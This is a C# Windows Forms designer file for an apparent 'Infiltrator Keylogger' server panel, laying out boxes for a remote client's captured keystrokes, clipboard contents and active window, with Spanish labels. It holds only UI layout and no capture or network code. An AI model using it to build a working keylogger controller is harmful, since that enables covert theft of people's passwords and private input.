namespace Server
{
    partial class Keylogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            label1 = new Label();
            richTextBox1 = new RichTextBox();
            button1 = new Button();
            groupBox1 = new GroupBox();
            label4 = new Label();
            richTextBox3 = new RichTextBox();
            richTextBox2 = new RichTextBox();
            label3 = new Label();
            label2 = new Label();
            pictureBox1 = new PictureBox();
            groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            SuspendLayout();
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Font = new Font("Segoe UI", 24F, FontStyle.Bold, GraphicsUnit.Point, 0);
            label1.ForeColor = Color.White;
            label1.Location = new Point(476, 15);
            label1.Name = "label1";
            label1.Size = new Size(329, 45);
            label1.TabIndex = 0;
            label1.Text = "Infiltrator Keylogger";
            // 
            // richTextBox1
            // 
            richTextBox1.BackColor = Color.FromArgb(18, 27, 36);
            richTextBox1.BorderStyle = BorderStyle.None;
            richTextBox1.Font = new Font("Consolas", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            richTextBox1.ForeColor = Color.FromArgb(224, 224, 224);
            richTextBox1.Location = new Point(6, 65);
            richTextBox1.Name = "richTextBox1";
            richTextBox1.ReadOnly = true;
            richTextBox1.ScrollBars = RichTextBoxScrollBars.Vertical;
            richTextBox1.Size = new Size(552, 525);
            richTextBox1.TabIndex = 1;
            richTextBox1.Text = "";
            // 
            // button1
            // 
            button1.ForeColor = Color.FromArgb(231, 76, 60);
            button1.Location = new Point(197, 619);
            button1.Name = "button1";
            button1.Size = new Size(107, 36);
            button1.TabIndex = 2;
            button1.Text = "Stop";
            button1.UseVisualStyleBackColor = true;
            button1.Click += button1_Click;
            // 
            // groupBox1
            // 
            groupBox1.BackColor = Color.FromArgb(44, 62, 80);
            groupBox1.Controls.Add(label4);
            groupBox1.Controls.Add(richTextBox3);
            groupBox1.Controls.Add(richTextBox2);
            groupBox1.Controls.Add(label3);
            groupBox1.Controls.Add(button1);
            groupBox1.Controls.Add(label2);
            groupBox1.Controls.Add(richTextBox1);
            groupBox1.Font = new Font("Segoe UI", 15.75F, FontStyle.Bold, GraphicsUnit.Point, 0);
            groupBox1.ForeColor = Color.FromArgb(211, 220, 230);
            groupBox1.Location = new Point(12, 72);
            groupBox1.Name = "groupBox1";
            groupBox1.Size = new Size(1151, 690);
            groupBox1.TabIndex = 3;
            groupBox1.TabStop = false;
            groupBox1.Text = "Client Info";
            // 
            // label4
            // 
            label4.AutoSize = true;
            label4.Font = new Font("Segoe UI", 14.25F, FontStyle.Bold);
            label4.Location = new Point(6, 37);
            label4.Name = "label4";
            label4.Size = new Size(175, 25);
            label4.TabIndex = 4;
            label4.Text = "Teclas presionadas";
            // 
            // richTextBox3
            // 
            richTextBox3.BackColor = Color.FromArgb(18, 27, 36);
            richTextBox3.BorderStyle = BorderStyle.None;
            richTextBox3.Font = new Font("Consolas", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            richTextBox3.ForeColor = Color.FromArgb(224, 224, 224);
            richTextBox3.Location = new Point(629, 388);
            richTextBox3.Name = "richTextBox3";
            richTextBox3.ReadOnly = true;
            richTextBox3.ScrollBars = RichTextBoxScrollBars.Vertical;
            richTextBox3.Size = new Size(500, 267);
            richTextBox3.TabIndex = 3;
            richTextBox3.Text = "";
            // 
            // richTextBox2
            // 
            richTextBox2.BackColor = Color.FromArgb(18, 27, 36);
            richTextBox2.BorderStyle = BorderStyle.None;
            richTextBox2.Font = new Font("Consolas", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            richTextBox2.ForeColor = Color.FromArgb(224, 224, 224);
            richTextBox2.Location = new Point(629, 65);
            richTextBox2.Name = "richTextBox2";
            richTextBox2.ReadOnly = true;
            richTextBox2.ScrollBars = RichTextBoxScrollBars.Vertical;
            richTextBox2.Size = new Size(500, 256);
            richTextBox2.TabIndex = 2;
            richTextBox2.Text = "";
            // 
            // label3
            // 
            label3.AutoSize = true;
            label3.Font = new Font("Segoe UI", 14.25F, FontStyle.Bold);
            label3.Location = new Point(814, 360);
            label3.Name = "label3";
            label3.Size = new Size(144, 25);
            label3.TabIndex = 1;
            label3.Text = "Ventana Activa";
            // 
            // label2
            // 
            label2.AutoSize = true;
            label2.Font = new Font("Segoe UI", 14.25F, FontStyle.Bold);
            label2.Location = new Point(764, 37);
            label2.Name = "label2";
            label2.Size = new Size(260, 25);
            label2.TabIndex = 0;
            label2.Text = "Contenido del portapapeles";
            // 
            // pictureBox1
            // 
            pictureBox1.BackgroundImage = Properties.Resources.icons8_teclado_50;
            pictureBox1.BackgroundImageLayout = ImageLayout.Zoom;
            pictureBox1.Location = new Point(339, 3);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new Size(191, 63);
            pictureBox1.TabIndex = 4;
            pictureBox1.TabStop = false;
            // 
            // Keylogger
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(30, 42, 56);
            ClientSize = new Size(1186, 773);
            Controls.Add(label1);
            Controls.Add(pictureBox1);
            Controls.Add(groupBox1);
            FormBorderStyle = FormBorderStyle.None;
            MaximizeBox = false;
            MinimizeBox = false;
            Name = "Keylogger";
            ShowIcon = false;
            StartPosition = FormStartPosition.CenterScreen;
            Text = "Keylogger";
            Load += Keylogger_Load;
            groupBox1.ResumeLayout(false);
            groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private Label label1;
        private RichTextBox richTextBox1;
        private Button button1;
        private GroupBox groupBox1;
        private Label label3;
        private Label label2;
        private RichTextBox richTextBox3;
        private RichTextBox richTextBox2;
        private PictureBox pictureBox1;
        private Label label4;
    }
}